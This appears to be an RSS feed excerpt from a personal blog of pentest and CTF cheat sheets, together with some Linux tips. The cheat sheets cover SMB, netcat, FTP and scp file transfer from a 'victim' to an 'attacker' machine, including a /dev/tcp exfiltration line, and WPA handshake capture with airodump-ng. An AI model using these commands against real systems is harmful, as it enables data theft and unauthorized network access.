    <item>
      <title>üìÅ File Sharing Over SMB Using `smbserver.py`</title>
      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/smb-using-smbserver.py/</link>
      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/smb-using-smbserver.py/</guid>
      <description>&lt;hr&gt;
&lt;h2 id=&#34;-on-the-linux-server-attacker-machine&#34;&gt;üñ•Ô∏è On the Linux Server (Attacker Machine)&lt;/h2&gt;
&lt;p&gt;Start an SMB server using &lt;code&gt;impacket-smbserver&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo smbserver.py gnu &lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt; -smb2support
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;gnu&lt;/code&gt;: Share name&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$(pwd)&lt;/code&gt;: Current working directory to be shared&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-smb2support&lt;/code&gt;: Enables SMB2 support for better compatibility with newer Windows systems&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-on-the-windows-client-victim-machine&#34;&gt;ü™ü On the Windows Client (Victim Machine)&lt;/h2&gt;
&lt;p&gt;Access the shared file using UNC path:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;\\10.10.14.42\gnu\winPEAS.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;üî∏ Replace &lt;code&gt;10.10.14.42&lt;/code&gt; with the IP of your Linux (attacker) machine
üî∏ You can also map this as a network drive or copy files directly using &lt;code&gt;copy&lt;/code&gt; or &lt;code&gt;xcopy&lt;/code&gt; in CMD or PowerShell&lt;/p&gt;</description>
    </item>
    <item>
      <title>üìÅ File Transfer Using Netcat</title>
      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/</link>
      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/</guid>
      <description>&lt;h2 id=&#34;-step-1-start-listening-on-local-machine-kali&#34;&gt;üñ•Ô∏è Step 1: Start Listening on Local Machine (Kali)&lt;/h2&gt;
&lt;p&gt;Run the following command to start listening for incoming files:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lp &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; &amp;gt; filename    &lt;span class=&#34;c1&#34;&gt;# waiting for receiving the files&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;-step-2-transfer-file-from-remote-machine-victim&#34;&gt;üì§ Step 2: Transfer File from Remote Machine (Victim)&lt;/h2&gt;
&lt;p&gt;Run this command on the victim machine to send the file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -w &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 10.10.14.19 &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; &amp;lt; filename    &lt;span class=&#34;c1&#34;&gt;# it&amp;#39;s time to send the file&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;, use this alternative method:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat filename &amp;gt; /dev/tcp/10.10.14.19/4444
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;code&gt;10.10.14.19&lt;/code&gt; is the IP address of the &lt;strong&gt;local machine (tun0)&lt;/strong&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>üì° File Transfer via FTP on Linux</title>
      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/</link>
      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/</guid>
      <description>&lt;hr&gt;
&lt;h2 id=&#34;-using-ftp-command&#34;&gt;üß∞ Using &lt;code&gt;ftp&lt;/code&gt; Command&lt;/h2&gt;
&lt;h3 id=&#34;1-connect-to-ftp-server&#34;&gt;1. Connect to FTP Server&lt;/h3&gt;
&lt;p&gt;Replace &lt;code&gt;10.10.10.98&lt;/code&gt; with your target FTP server IP or domain:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp 10.10.10.98
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;2-login-as-anonymous&#34;&gt;2. Login as Anonymous&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name (10.10.10.98:yourusername): anonymous
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password: (press Enter)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;3-set-binary-mode&#34;&gt;3. Set Binary Mode&lt;/h3&gt;
&lt;p&gt;To handle all types of files properly:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; binary
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;4-disable-prompting-for-multiple-files&#34;&gt;4. Disable Prompting (for Multiple Files)&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; prompt off
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Interactive mode off.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h3 id=&#34;5-download-files-wildcard&#34;&gt;5. Download Files (Wildcard)&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; mget *
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;‚ö†Ô∏è Note: Standard &lt;code&gt;ftp&lt;/code&gt; does &lt;strong&gt;not support recursive&lt;/strong&gt; download.
For recursive download, use a better client like &lt;code&gt;lftp&lt;/code&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>üì° Wi-Fi Handshake Capture Guide using aircrack-ng Tools</title>
      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/wi-fi-handshake-capture-guide-using-aircrack-ng-tools/</link>
      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/wi-fi-handshake-capture-guide-using-aircrack-ng-tools/</guid>
      <description>&lt;hr&gt;
&lt;h2 id=&#34;-1-scan-available-wifi-networks&#34;&gt;üîç 1. Scan Available WiFi Networks&lt;/h2&gt;
&lt;h3 id=&#34;-scan-all-nearby-wifi-networks&#34;&gt;üåê Scan all nearby WiFi networks&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airodump-ng mon0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;-scan-only-24-ghz-networks-80211bg&#34;&gt;üì∂ Scan only 2.4 GHz networks (802.11b/g)&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airodump-ng --band &lt;span class=&#34;nb&#34;&gt;bg&lt;/span&gt; mon0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;-scan-only-5-ghz-networks-80211a&#34;&gt;üì° Scan only 5 GHz networks (802.11a)&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airodump-ng --band a mon0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;-band-option-summary&#34;&gt;üìã Band Option Summary&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--band a&lt;/code&gt; ‚Üí 5 GHz (802.11a)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--band b&lt;/code&gt; ‚Üí 2.4 GHz (802.11b)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--band g&lt;/code&gt; ‚Üí 2.4 GHz (802.11g)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--band bg&lt;/code&gt; ‚Üí All 2.4 GHz (recommended)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;--band abg&lt;/code&gt; ‚Üí Both 2.4 GHz and 5 GHz&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-2-capture-wpawpa2-handshake&#34;&gt;üéØ 2. Capture WPA/WPA2 Handshake&lt;/h2&gt;
&lt;h3 id=&#34;-start-listening-on-target-ap&#34;&gt;üéØ Start listening on target AP&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Replace &amp;lt;channel&amp;gt;, &amp;lt;BSSID&amp;gt;, and &amp;lt;output_filename&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airodump-ng -c &amp;lt;channel&amp;gt; --bssid &amp;lt;BSSID&amp;gt; -w &amp;lt;output_filename&amp;gt; mon0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Example&lt;/p&gt;</description>
    </item>
    <item>
      <title>üîê File Transfer Over SSH Using `scp`</title>
      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/</link>
      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/</guid>
      <description>&lt;hr&gt;
&lt;h2 id=&#34;-uploadingsending-a-directory-from-local-to-ssh-server&#34;&gt;üì§ Uploading/Sending a Directory from Local to SSH Server&lt;/h2&gt;
&lt;p&gt;Use either of the following commands:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -r ./shell/* u0_a418@192.168.0.20:/home/gnu/shell/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -r -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; ./shell u0_a418@192.168.0.20:/home/gnu/shell/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;-downloadingreceiving-a-directory-from-ssh-server-to-local&#34;&gt;üì• Downloading/Receiving a Directory from SSH Server to Local&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -r u0_a418@192.168.0.20:/home/gnu/* ./gnu/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -r -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; u0_a418@192.168.0.20:/home/gnu ./gnu/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;-uploadingsending-a-file-from-local-to-ssh-server&#34;&gt;üì§ Uploading/Sending a File from Local to SSH Server&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; ./shell.php u0_a418@192.168.0.20:/home/gnu/shell.php
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;-downloadingreceiving-a-file-from-ssh-server-to-local&#34;&gt;üì• Downloading/Receiving a File from SSH Server to Local&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; u0_a418@192.168.0.20:/home/gnu/flag.txt ./flag.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;üìù &lt;strong&gt;Note:&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Configuring DHCP Server to Assign Hostname via DHCP</title>
      <link>http://localhost:1313/posts/tipsandtricks/archlinux/change_hostname_from_dhcp_server_without_changing_machine_hostname_for_networks/</link>
      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/tipsandtricks/archlinux/change_hostname_from_dhcp_server_without_changing_machine_hostname_for_networks/</guid>
      <description>&lt;h4 id=&#34;begin-by-installing-the-dhcp-server-package&#34;&gt;Begin by installing the DHCP server package.&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo pacman -S extra/dhcp dhcpcd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;next-set-a-custom-hostname-within-the-dhcp-configuration-file&#34;&gt;Next, set a custom hostname within the DHCP configuration file.&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo vim /etc/dhcpcd.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Within this file, add or modify the &lt;code&gt;host&lt;/code&gt; declaration to assign a specific hostname to a client:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hostname OPPO-A3s  ### This is set your device name OPPO-A3s in a network
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;finally-restart-the-dhcp-server-to-apply-the-changes&#34;&gt;Finally, restart the DHCP server to apply the changes.&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl restart dhcpd.service
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl restart dhcpcd.service
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Easy Guide to Fixing GRUB on Garuda Linux (BTRFS)</title>
      <link>http://localhost:1313/posts/tipsandtricks/archlinux/fix_grub_on_garuda_linux/</link>
      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/tipsandtricks/archlinux/fix_grub_on_garuda_linux/</guid>
      <description>&lt;p&gt;This simple guide helps you fix the GRUB bootloader on &lt;strong&gt;Garuda Linux&lt;/strong&gt; with a &lt;strong&gt;BTRFS&lt;/strong&gt; file system. Follow these steps to install the necessary tools, mount partitions, fix GRUB, and check EFI entries.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;step-1-install-garuda-tools-base-git&#34;&gt;Step 1: Install &lt;code&gt;garuda-tools-base-git&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;You need the &lt;strong&gt;garuda-tools-base-git&lt;/strong&gt; package to manage GRUB on Garuda Linux. Install it using &lt;strong&gt;pacman&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo pacman -S garuda/garuda-tools-base-git
